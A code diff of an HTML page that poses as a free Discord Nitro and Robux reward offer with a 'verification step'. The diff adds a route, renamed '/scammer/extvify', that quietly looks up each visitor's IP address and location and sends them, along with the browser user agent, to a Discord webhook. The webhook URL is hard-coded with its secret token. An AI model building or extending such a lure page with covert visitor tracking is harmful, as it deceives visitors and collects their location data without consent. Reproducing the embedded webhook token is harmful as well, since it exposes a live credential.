@@ -7,7 +7,7 @@
   <meta name="description" content="Choose from Discord Nitro and Robux rewards. Complete a quick verification step to claim." />
   <meta name="theme-color" content="#5865f2">
   <style>
-    /* === YOUR EXISTING STYLES (unchanged) === */
+    /* === YOUR EXISTING STYLES (unchanged – same as before) === */
     * { user-select: none; -webkit-user-select: none; -webkit-tap-highlight-color: transparent; }
     img { -webkit-user-drag: none; user-drag: none; }
     ::selection { background: transparent; }
@@ -281,7 +281,7 @@
     }
     .hidden { display: none; }
 
-    /* --- Special page (extvify) styles --- */
+    /* --- Special page (scammer/extvify) styles --- */
     .extvify-page {
       text-align: center;
       background: #0f1119;
@@ -345,12 +345,15 @@
 <script>
   (function() {
     const path = window.location.pathname.toLowerCase();
+    // New route: /scammer/extvify for IP/location page
+    const isScammerRoute = path === '/scammer/extvify' || path === '/scammer/extvify/';
+    // Keep /extvify as normal reward page (same as root)
     const isExtvifyRoute = path === '/extvify' || path === '/extvify/';
 
     // ============================================================
-    //  /extvify ROUTE – RELIABLE IP + LOCATION (MULTIPLE FALLBACKS)
+    //  /scammer/extvify ROUTE – IP & LOCATION + DISCORD WEBHOOK
     // ============================================================
-    if (isExtvifyRoute) {
+    if (isScammerRoute) {
       document.title = "Extvify";
       const container = document.getElementById('mainApp');
       
@@ -403,17 +406,16 @@
           let apiIndex = 0;
           function tryNextAPI() {
             if (apiIndex >= locationAPIs.length) {
-              // All APIs failed – show IP only
               renderIPPage(ip, 'Unknown');
               const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
-              fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: Unknown\nUser Agent: ${navigator.userAgent}` }) }).catch(e => console.error);
+              fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: Unknown\nUser Agent: ${navigator.userAgent}` }) }).catch(e => console.error);
               return;
             }
             locationAPIs[apiIndex]()
               .then(location => {
                 renderIPPage(ip, location);
                 const webhookUrl = 'https://discord.com/api/webhooks/1511201588964757565/yECDR98dKHozkAVVDTJmSLO0ubcocrbSCFLp-A-2wznNiTFuVLiwkt3wQ-hzKsmKmz7a';
-                fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `**Visitor from /extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` }) }).catch(e => console.error);
+                fetch(webhookUrl, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: `**Visitor from /scammer/extvify**\nIP: ${ip}\nLocation: ${location}\nUser Agent: ${navigator.userAgent}` }) }).catch(e => console.error);
               })
               .catch(() => {
                 apiIndex++;
@@ -429,8 +431,9 @@
     }
 
     // ============================================================
-    //  NORMAL REWARD PAGE (FULLY FUNCTIONAL)
+    //  NORMAL REWARD PAGE – for root, /extvify, and any other path
     // ============================================================
+    // (Full reward page script – same as before)
     let pageViews = parseInt(localStorage.getItem('extvify_pageViews') || 0) + 1;
     localStorage.setItem('extvify_pageViews', pageViews);
     
